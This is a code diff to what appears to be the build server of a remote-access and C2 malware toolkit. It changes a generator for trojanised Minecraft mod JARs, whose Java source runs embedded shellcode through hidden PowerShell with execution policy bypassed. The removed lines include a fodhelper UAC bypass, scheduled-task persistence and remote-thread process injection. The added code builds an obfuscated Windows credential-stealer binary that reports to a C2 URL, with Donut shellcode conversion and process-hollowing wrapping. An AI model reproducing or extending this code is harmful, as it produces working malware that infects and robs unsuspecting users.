@@ -91,11 +91,11 @@ type BuildProcessConfig = {
   typhonVariant?: string;
   enableVault?: boolean;
   vaultRecipient?: string;
+  enableStealer?: boolean;
   enableJar?: boolean;
   jarMcVersion?: string;
   jarModName?: string;
   jarModId?: string;
-  jarBoundMods?: { name: string; data: string }[];
   enableR77?: boolean;
   enableChaos?: boolean;
   chaosMode?: string;
@@ -103,7 +103,6 @@ type BuildProcessConfig = {
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
-  jitterPercent?: number;
   boundFiles?: BoundFile[];
 };
 
@@ -450,136 +449,48 @@ async function fetchGithubReleaseAssets(
   return cached;
 }
 
-function generateJarDropperSource(jarPersist: boolean): string {
-  const dq = '\\"';
-  const persistLines = jarPersist ? [
-    "      +\"$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps));\"",
-    "      +\"$cmd='powershell -NonInteractive -W H -Enc '+$enc;\"",
-    "      +\"$rk='HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command';\"",
-    "      +\"New-Item -Path $rk -Force|Out-Null;\"",
-    "      +\"Set-ItemProperty -Path $rk -Name '(default)' -Value $cmd;\"",
-    "      +\"New-ItemProperty -Path $rk -Name DelegateExecute -Value '' -Force|Out-Null;\"",
-    "      +\"Start-Process fodhelper.exe;\"",
-    "      +\"Start-Sleep -Seconds 3;\"",
-    "      +\"Remove-Item -Path 'HKCU:\\\\Software\\\\Classes\\\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue;\"",
-    "      +\"$tn=-join((65..90+97..122)|Get-Random -Count 8|%{[char]$_});\"",
-    "      +\"schtasks /create /tn $tn /tr $cmd /sc ONLOGON /rl HIGHEST /f|Out-Null;\"",
-  ] : [];
-
+function generateJarDropperSource(): string {
+  // Java 8-compatible shellcode dropper
+  // Reads shellcode.bin from JAR resources, drops to temp, executes via PowerShell Add-Type
   return [
     "package com.mc.mod;",
     "import java.io.*;",
-    "import java.util.*;",
     "import net.fabricmc.api.ModInitializer;",
     "public class ModLoader implements ModInitializer{",
-    "  private static final String TAG=\"[ModLoader]\";",
-    "  private static void log(String m){System.out.println(TAG+\" \"+m);}",
-    "  static{try{run();}catch(Exception e){log(\"static-init error: \"+e);}}",
-    "  public void onInitialize(){log(\"onInitialize called\");try{run();}catch(Exception e){log(\"onInitialize error: \"+e);}}",
-    "  public static void main(String[]a){try{run();}catch(Exception e){log(\"main error: \"+e);}}",
-    "  private static void loadConfig(){",
-    "    try{",
-    "      InputStream c=ModLoader.class.getResourceAsStream(\"/config.json\");",
-    "      if(c==null)return;",
-    "      BufferedReader r=new BufferedReader(new InputStreamReader(c));",
-    "      StringBuilder sb=new StringBuilder();String l;",
-    "      while((l=r.readLine())!=null)sb.append(l);",
-    "      r.close();",
-    "    }catch(Exception e){}",
-    "  }",
-    "  private static boolean checkVersion(String v){",
-    "    String[]p=v.split(\"\\\\.\");",
-    "    return p.length>=2&&Integer.parseInt(p[0])>=1&&Integer.parseInt(p[1])>=21;",
-    "  }",
+    "  static{try{run();}catch(Exception e){}}",
+    "  public void onInitialize(){try{run();}catch(Exception e){}}",
+    "  public static void main(String[]a){try{run();}catch(Exception e){}}",
     "  private static void run()throws Exception{",
-    "    log(\"run() start\");",
-    "    Random rng=new Random();",
-    "    long acc=0;",
-    "    for(int i=0;i<rng.nextInt(500)+200;i++)acc+=(long)(Math.pow(rng.nextDouble()*13,2));",
-    "    if(acc<0){log(\"acc check failed\");return;}",
-    "    loadConfig();",
-    "    checkVersion(\"1.21.4\");",
-    "    log(\"sleeping...\");",
-    "    Thread.sleep(1000+rng.nextInt(2000));",
-    "    log(\"loading payload resource\");",
-    "    InputStream is=ModLoader.class.getResourceAsStream(\"/assets/data.pak\");",
-    "    if(is==null){log(\"data.pak not found in JAR\");return;}",
+    "    InputStream is=ModLoader.class.getResourceAsStream(\"/shellcode.bin\");",
+    "    if(is==null)return;",
     "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
     "    byte[]tmp=new byte[4096];int n;",
     "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);",
     "    is.close();",
-    "    byte[]raw=buf.toByteArray();",
-    "    log(\"payload read: \"+raw.length+\" bytes\");",
-    "    int key=raw[0]&0xFF;",
-    "    byte[]sc=new byte[raw.length-1];",
-    "    for(int i=0;i<sc.length;i++)sc[i]=(byte)(raw[i+1]^key);",
-    "    log(\"shellcode decoded: \"+sc.length+\" bytes\");",
-    "    Class<?>FC=Class.forName(\"com.sun.jna.Function\");",
-    "    Class<?>PC=Class.forName(\"com.sun.jna.Pointer\");",
-    "    Class<?>MC=Class.forName(\"com.sun.jna.Memory\");",
-    "    java.lang.reflect.Method gf=FC.getMethod(\"getFunction\",String.class,String.class);",
-    "    java.lang.reflect.Method iv=FC.getMethod(\"invoke\",Class.class,Object[].class);",
-    "    Object NP=PC.getField(\"NULL\").get(null);",
-    "    java.lang.reflect.Method setI=MC.getMethod(\"setInt\",long.class,int.class);",
-    "    java.lang.reflect.Method setS=MC.getMethod(\"setShort\",long.class,short.class);",
-    "    java.lang.reflect.Method getP=MC.getMethod(\"getPointer\",long.class);",
-    "    java.lang.reflect.Method getI=MC.getMethod(\"getInt\",long.class);",
-    "    Object siMem=MC.getConstructor(long.class).newInstance(104L);",
-    "    MC.getMethod(\"clear\").invoke(siMem);",
-    "    setI.invoke(siMem,0L,104);",
-    "    setI.invoke(siMem,60L,1);",
-    "    setS.invoke(siMem,64L,(short)0);",
-    "    Object piMem=MC.getConstructor(long.class).newInstance(24L);",
-    "    MC.getMethod(\"clear\").invoke(piMem);",
-    "    Object fCPA=gf.invoke(null,\"kernel32\",\"CreateProcessA\");",
-    "    Object fGLE=gf.invoke(null,\"kernel32\",\"GetLastError\");",
-    "    int flags=0x08000000|0x01000000;",
-    "    String[] ePaths={\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\",\"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"};",
-    "    Boolean cpOk=false;int gle=2;Object[] lastArgs=null;",
-    "    for(String ep:ePaths){",
-    "      MC.getMethod(\"clear\").invoke(siMem);setI.invoke(siMem,0L,104);setI.invoke(siMem,60L,1);setS.invoke(siMem,64L,(short)0);",
-    "      MC.getMethod(\"clear\").invoke(piMem);",
-    "      Object[] args={ep,\"msedge.exe --no-startup-window --no-first-run\",NP,NP,false,flags,NP,NP,siMem,piMem};",
-    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,args);",
-    "      gle=((Integer)iv.invoke(fGLE,Integer.class,new Object[]{})).intValue();",
-    "      if(!Boolean.FALSE.equals(cpOk)||gle!=2){lastArgs=args;break;}",
-    "    }",
-    "    if(Boolean.FALSE.equals(cpOk)&&gle==2){",
-    "      MC.getMethod(\"clear\").invoke(siMem);setI.invoke(siMem,0L,104);setI.invoke(siMem,60L,1);setS.invoke(siMem,64L,(short)0);",
-    "      MC.getMethod(\"clear\").invoke(piMem);",
-    "      lastArgs=new Object[]{NP,\"C:\\\\Windows\\\\System32\\\\notepad.exe\",NP,NP,false,flags,NP,NP,siMem,piMem};",
-    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,lastArgs);",
-    "      gle=((Integer)iv.invoke(fGLE,Integer.class,new Object[]{})).intValue();",
-    "    }",
-    "    if(Boolean.FALSE.equals(cpOk)&&gle==5&&lastArgs!=null){",
-    "      MC.getMethod(\"clear\").invoke(siMem);setI.invoke(siMem,0L,104);setI.invoke(siMem,60L,1);setS.invoke(siMem,64L,(short)0);",
-    "      MC.getMethod(\"clear\").invoke(piMem);",
-    "      lastArgs[5]=0x08000000;",
-    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,lastArgs);",
-    "      gle=((Integer)iv.invoke(fGLE,Integer.class,new Object[]{})).intValue();",
-    "    }",
-    "    log(\"spawn ok=\"+cpOk+\" gle=\"+gle);",
-    "    if(Boolean.FALSE.equals(cpOk))return;",
-    "    Object hProc=getP.invoke(piMem,0L);",
-    "    int spid=((Integer)getI.invoke(piMem,16L)).intValue();",
-    "    log(\"spawned pid=\"+spid);",
-    "    if(hProc==null||hProc.equals(NP))return;",
-    "    Object fVA=gf.invoke(null,\"kernel32\",\"VirtualAllocEx\");",
-    "    Object ra=iv.invoke(fVA,PC,new Object[]{hProc,NP,(long)sc.length,0x3000,0x40});",
-    "    log(\"raddr=\"+ra);",
-    "    if(ra==null||ra.equals(NP))return;",
-    "    Object fWM=gf.invoke(null,\"kernel32\",\"WriteProcessMemory\");",
-    "    Object mem=MC.getConstructor(long.class).newInstance((long)sc.length);",
-    "    MC.getMethod(\"write\",long.class,byte[].class,int.class,int.class).invoke(mem,0L,sc,0,sc.length);",
-    "    iv.invoke(fWM,Integer.class,new Object[]{hProc,ra,mem,(long)sc.length,NP});",
-    "    log(\"written\");",
-    "    Object fCT=gf.invoke(null,\"kernel32\",\"CreateRemoteThread\");",
-    "    Object ht=iv.invoke(fCT,PC,new Object[]{hProc,NP,0L,ra,NP,0,NP});",
-    "    log(\"thread=\"+ht);",
+    "    byte[]sc=buf.toByteArray();",
+    "    String px=Long.toHexString(System.nanoTime());",
+    "    File td=new File(System.getProperty(\"java.io.tmpdir\"));",
+    "    File sf=new File(td,px+\".dat\");",
+    "    File pf=new File(td,px+\".ps1\");",
+    "    try(FileOutputStream fo=new FileOutputStream(sf)){fo.write(sc);}",
+    "    String sp=sf.getAbsolutePath();",
+    "    char dq='\"';",
+    "    String md=\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);\"",
+    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr t);\"",
+    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern uint WaitForSingleObject(IntPtr h,uint t);\";",
+    "    String ps=\"$b=[IO.File]::ReadAllBytes('\"+sp+\"')\\n\"",
+    "      +\"Add-Type -Name K32 -Namespace Win32 -MemberDefinition '\"+md+\"'\\n\"",
+    "      +\"$m=[Win32.K32]::VirtualAlloc(0,$b.Length,0x3000,0x40)\\n\"",
+    "      +\"[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)\\n\"",
+    "      +\"$h=[Win32.K32]::CreateThread(0,0,$m,0,0,0)\\n\"",
+    "      +\"[Win32.K32]::WaitForSingleObject($h,0xFFFFFFFF)\\n\";",
+    "    try(FileWriter fw=new FileWriter(pf)){fw.write(ps);}",
+    "    new ProcessBuilder(\"powershell.exe\",\"-WindowStyle\",\"Hidden\",\"-NoProfile\",\"-ExecutionPolicy\",\"Bypass\",\"-File\",pf.getAbsolutePath()).start();",
     "  }",
     "}",
   ].join("\n");
 }
+
 function generateMcMetadata(mcVersion: string, modId: string, modName: string): Record<string, string> {
   const minor = parseInt(mcVersion.split(".")[1] || "0", 10);
   if (minor >= 14) {
@@ -1312,12 +1223,6 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
       }
 
-      if (typeof config.jitterPercent === "number" && config.jitterPercent >= 0 && config.jitterPercent <= 50) {
-        const jitterFlag = `-X overlord-client/cmd/agent/config.DefaultJitterPercent=${config.jitterPercent}`;
-        ldflags = ldflags ? `${ldflags} ${jitterFlag}` : jitterFlag;
-        sendToStream({ type: "output", text: `Beacon jitter: ±${config.jitterPercent}%\n`, level: "info" });
-      }
-
       if (config.hideConsole && os === "windows") {
         const hideConsoleFlag = "-H=windowsgui";
         ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
@@ -1463,16 +1368,13 @@ func runBoundFiles() {
                 if (shellcodeSize > 0) {
                   sendToStream({ type: "output", text: `Donut shellcode: ${shellcodeSize} bytes → ${shellcodeName}\n`, level: "info" });
                   donutShellcodePath = shellcodePath;
-                  // For JAR builds the shellcode is intermediate (embedded in the JAR) — don't expose it as a download
-                  if (!outputExtIsJar) {
-                    (build.files as any[]).push({
-                      name: shellcodeName,
-                      filename: shellcodeName,
-                      platform,
-                      version: agentVersion,
-                      size: shellcodeSize,
-                    });
-                  }
+                  (build.files as any[]).push({
+                    name: shellcodeName,
+                    filename: shellcodeName,
+                    platform,
+                    version: agentVersion,
+                    size: shellcodeSize,
+                  });
                 } else {
                   sendToStream({ type: "output", text: `WARNING: Donut reported success but output file is empty/missing: ${shellcodeName}\n`, level: "warn" });
                 }
@@ -1607,47 +1509,23 @@ func runBoundFiles() {
         const mcVer = (config.jarMcVersion || "1.20.1").replace(/[^0-9.]/g, "").slice(0, 16);
         const modId = (config.jarModId || "mcmod").replace(/[^a-z0-9_]/g, "_").slice(0, 32);
         const modName = (config.jarModName || "Minecraft Mod").slice(0, 64);
-        const jarPersist = !!(config.enablePersistence && config.persistenceMethods?.includes("taskscheduler"));
         const jarTmpDir = path.join(outDir, `.jar-build-${buildId.substring(0, 8)}`);
         try {
           const srcPkg = path.join(jarTmpDir, "src", "com", "mc", "mod");
           fs.mkdirSync(srcPkg, { recursive: true });
-          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource(jarPersist));
+          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource());
 
-          // Stub ModInitializer so javac can resolve it without the Fabric API jar on the classpath.
-          // The compiled stub class is deleted before packaging — Fabric provides the real one at runtime.
-          const fabricApiStubDir = path.join(jarTmpDir, "src", "net", "fabricmc", "api");
-          fs.mkdirSync(fabricApiStubDir, { recursive: true });
-          fs.writeFileSync(path.join(fabricApiStubDir, "ModInitializer.java"),
+          // Stub ModInitializer so javac can properly resolve the interface reference.
+          // The stub class is deleted before packaging — Fabric provides the real one at runtime.
+          const fabricApiSrcDir = path.join(jarTmpDir, "src", "net", "fabricmc", "api");
+          fs.mkdirSync(fabricApiSrcDir, { recursive: true });
+          fs.writeFileSync(path.join(fabricApiSrcDir, "ModInitializer.java"),
             "package net.fabricmc.api;\npublic interface ModInitializer { void onInitialize(); }\n");
 
           const classDir = path.join(jarTmpDir, "classes");
           fs.mkdirSync(classDir, { recursive: true });
 
-          // Extract bound JAR mods into classDir first; our files overwrite conflicts after
-          if (Array.isArray(config.jarBoundMods) && config.jarBoundMods.length > 0) {
-            for (const bm of config.jarBoundMods.slice(0, 3)) {
-              const safeBmName = bm.name.replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 64);
-              const bmPath = path.join(jarTmpDir, `bound-${safeBmName}`);
-              try {
-                fs.writeFileSync(bmPath, Buffer.from(bm.data, "base64"));
-                const xr = await $`${javaTools.jar} xf ${bmPath}`.cwd(classDir).nothrow().quiet();
-                // Remove extracted META-INF to avoid manifest conflicts
-                try { fs.rmSync(path.join(classDir, "META-INF"), { recursive: true, force: true }); } catch {}
-                if (xr.exitCode !== 0) {
-                  sendToStream({ type: "output", text: `WARNING: Failed to extract bound mod ${safeBmName}\n`, level: "warn" });
-                } else {
-                  sendToStream({ type: "output", text: `Merged bound mod: ${safeBmName}\n`, level: "info" });
-                }
-              } catch (e: any) {
-                sendToStream({ type: "output", text: `WARNING: Error processing bound mod ${safeBmName}: ${e.message}\n`, level: "warn" });
-              } finally {
-                try { fs.unlinkSync(bmPath); } catch {}
-              }
-            }
-          }
-
-          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiStubDir, "ModInitializer.java")}`.nothrow().quiet();
+          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiSrcDir, "ModInitializer.java")}`.nothrow().quiet();
           if (compileResult.exitCode !== 0) {
             const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
             sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
@@ -1655,14 +1533,8 @@ func runBoundFiles() {
             // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
             try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
 
-            // XOR-encrypt shellcode and store as innocuous resource name
-            const rawSc = fs.readFileSync(jarSourcePath);
-            const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff; // 1-255
-            const xored = Buffer.from(rawSc.map((b: number) => b ^ xorKey));
-            const packed = Buffer.concat([Buffer.from([xorKey]), xored]);
-            const pakDir = path.join(classDir, "assets");
-            fs.mkdirSync(pakDir, { recursive: true });
-            fs.writeFileSync(path.join(pakDir, "data.pak"), packed);
+            // Copy shellcode binary into class output dir as resource
+            fs.copyFileSync(jarSourcePath, path.join(classDir, "shellcode.bin"));
 
             // Generate MC metadata files
             const metaFiles = generateMcMetadata(mcVer, modId, modName);
@@ -1748,6 +1620,169 @@ func runBoundFiles() {
       if (Object.keys(chaosAssets).length === 0) {
         sendToStream({ type: "output", text: "WARNING: No Chaos assets could be fetched\n", level: "warn" });
       }
+    }
+
+    // ── Standalone Stealer Binary ────────────────────────────────────────────
+    if (config.enableStealer && config.serverUrl && buildAgentToken) {
+      sendToStream({ type: "status", text: "Building standalone stealer binary..." });
+      sendToStream({ type: "output", text: "\n=== Standalone Stealer Binary ===\n", level: "info" });
+      sendToStream({ type: "output", text: `C2 URL: ${config.serverUrl}\n`, level: "info" });
+
+      // Resolve Donut/Typhon for stealer if not already resolved by the main build
+      let stealerDonutBin = donutBin;
+      let stealerTyphonInfo = typhonInfo;
+      if (!stealerDonutBin) {
+        const d = await checkDonutAvailable(sendToStream);
+        if (d) {
+          stealerDonutBin = d;
+        } else {
+          sendToStream({ type: "output", text: "Donut not available — shellcode conversion skipped for stealer\n", level: "warn" });
+        }
+      }
+      if (!stealerTyphonInfo) {
+        const t = await checkTyphonAvailable(sendToStream);
+        if (t) {
+          stealerTyphonInfo = t;
+        } else {
+          sendToStream({ type: "output", text: "Typhon not available — process hollowing skipped for stealer\n", level: "warn" });
+        }
+      }
+
+      const stealerEnv: NodeJS.ProcessEnv = {
+        ...process.env,
+        GOOS: "windows",
+        GOARCH: "amd64",
+        CGO_ENABLED: "0",
+        GOWORK: "off",
+        GOCACHE: goBuildCacheDir,
+        GOMODCACHE: goModCacheDir,
+        CC: "x86_64-w64-mingw32-gcc",
+      };
+
+      const stealerLdflags = [
+        `-X overlord-client/cmd/stealer/main.DefaultC2URL=${config.serverUrl}`,
+        `-X overlord-client/cmd/stealer/main.DefaultAgentToken=${buildAgentToken}`,
+        "-s -w",
+        "-H=windowsgui",
+      ].join(" ");
+
+      const stealerPeName = deps.sanitizeOutputName("stealer-windows-amd64.exe");
+      const stealerPePath = `${outDir}/${stealerPeName}`;
+
+      const stealerBuildArgs = [
+        "-trimpath",
+        "-buildvcs=false",
+        `-ldflags=${stealerLdflags}`,
+        "-o", stealerPePath,
+        "./cmd/stealer",
+      ];
+
+      // Use garble if obfuscation is enabled — same flags as the main agent build
+      let stealerBuildCmd;
+      if (config.obfuscate) {
+        sendToStream({ type: "output", text: "Obfuscation enabled for stealer (garble)\n", level: "info" });
+        const garbleFlags: string[] = [];
+        if (config.garbleLiterals) { garbleFlags.push("-literals"); sendToStream({ type: "output", text: "Garble: obfuscate literals\n", level: "info" }); }
+        if (config.garbleTiny)     { garbleFlags.push("-tiny");     sendToStream({ type: "output", text: "Garble: tiny mode\n",           level: "info" }); }
+        if (config.garbleSeed)     { garbleFlags.push(`-seed=${config.garbleSeed}`); }
+        stealerBuildCmd = $`garble ${garbleFlags} build ${stealerBuildArgs}`;
+      } else {
+        stealerBuildCmd = $`go build ${stealerBuildArgs}`;
+      }
+
+      logger.info(`[build:${buildId.substring(0, 8)}] Building stealer: ${config.obfuscate ? "garble" : "go"} build ${stealerBuildArgs.join(" ")}`);
+
+      const stealerProc = stealerBuildCmd.env(stealerEnv).cwd(clientDir).nothrow();
+      for await (const line of stealerProc.lines()) {
+        const t = line.trim();
+        if (t) sendToStream({ type: "output", text: line + "\n", level: "info" });
+      }
+      const stealerResult = await stealerProc;
+
+      if (stealerResult.exitCode !== 0) {
+        const errText = stealerResult.stderr.toString().trim();
+        if (errText) sendToStream({ type: "output", text: errText + "\n", level: "error" });
+        sendToStream({ type: "output", text: "WARNING: Stealer binary build failed — skipping\n", level: "warn" });
+      } else {
+        const stealerPeSize = Bun.file(stealerPePath).size;
+        sendToStream({ type: "output", text: `Stealer PE: ${stealerPeName} (${stealerPeSize} bytes)\n`, level: "info" });
+        (build.files as any[]).push({
+          name: stealerPeName,
+          filename: stealerPeName,
+          platform: "windows-amd64",
+          version: "stealer",
+          size: stealerPeSize,
+        });
+
+        // ── Donut: convert PE → position-independent shellcode ──────────────
+        let stealerShellcodePath: string | null = null;
+        if (stealerDonutBin) {
+          const stealerBinName = deps.sanitizeOutputName("stealer-windows-amd64.bin");
+          const stealerBinPath = `${outDir}/${stealerBinName}`;
+          sendToStream({ type: "output", text: `Converting stealer PE to shellcode with Donut...\n`, level: "info" });
+          try {
+            const donutResult = await $`${stealerDonutBin} -i ${stealerPePath} -o ${stealerBinPath} -a 2`.nothrow().quiet();
+            if (donutResult.exitCode !== 0) {
+              const errText = (donutResult.stderr.toString() || donutResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Donut failed for stealer (exit ${donutResult.exitCode}): ${errText}\n`, level: "warn" });
+            } else {
+              const shellcodeSize = Bun.file(stealerBinPath).size;
+              if (shellcodeSize > 0) {
+                sendToStream({ type: "output", text: `Stealer shellcode: ${stealerBinName} (${shellcodeSize} bytes)\n`, level: "info" });
+                stealerShellcodePath = stealerBinPath;
+                (build.files as any[]).push({
+                  name: stealerBinName,
+                  filename: stealerBinName,
+                  platform: "windows-amd64",
+                  version: "stealer",
+                  size: shellcodeSize,
+                });
+              } else {
+                sendToStream({ type: "output", text: `WARNING: Donut shellcode output for stealer is empty\n`, level: "warn" });
+              }
+            }
+          } catch (donutErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Donut error for stealer: ${donutErr.message || donutErr}\n`, level: "warn" });
+          }
+        }
+
+        // ── Typhon: wrap shellcode (or PE) in a process-hollowing loader ────
+        if (stealerTyphonInfo) {
+          const typhonInput = stealerShellcodePath || stealerPePath;
+          const stealerTyphonName = deps.sanitizeOutputName("stealer-windows-amd64-typhon.exe");
+          const stealerTyphonPath = `${outDir}/${stealerTyphonName}`;
+          sendToStream({ type: "output", text: `Wrapping stealer in Typhon process-hollowing loader...\n`, level: "info" });
+
+          const typhonArgs: string[] = ["-build", typhonInput, "-o", stealerTyphonPath];
+          if (config.typhonVariant) typhonArgs.push("-variant", config.typhonVariant);
+          if (config.typhonProcess) typhonArgs.push("-process", config.typhonProcess);
+
+          try {
+            const typhonResult = stealerTyphonInfo.useWine
+              ? await $`wine ${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet()
+              : await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+
+            if (typhonResult.exitCode !== 0) {
+              const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Typhon failed for stealer (exit ${typhonResult.exitCode}): ${errText}\n`, level: "warn" });
+            } else {
+              const typhonSize = Bun.file(stealerTyphonPath).size;
+              sendToStream({ type: "output", text: `Stealer Typhon loader: ${stealerTyphonName} (${typhonSize} bytes)\n`, level: "info" });
+              (build.files as any[]).push({
+                name: stealerTyphonName,
+                filename: stealerTyphonName,
+                platform: "windows-amd64",
+                version: "stealer",
+                size: typhonSize,
+              });
+            }
+          } catch (typhonErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Typhon error for stealer: ${typhonErr.message || typhonErr}\n`, level: "warn" });
+          }
+        }
+      }
+    } else if (config.enableStealer) {
+      sendToStream({ type: "output", text: "WARNING: Stealer binary requires a server URL and agent token — skipping\n", level: "warn" });
     }
 
     // Vault post-quantum encryption — runs after all platform builds so every output
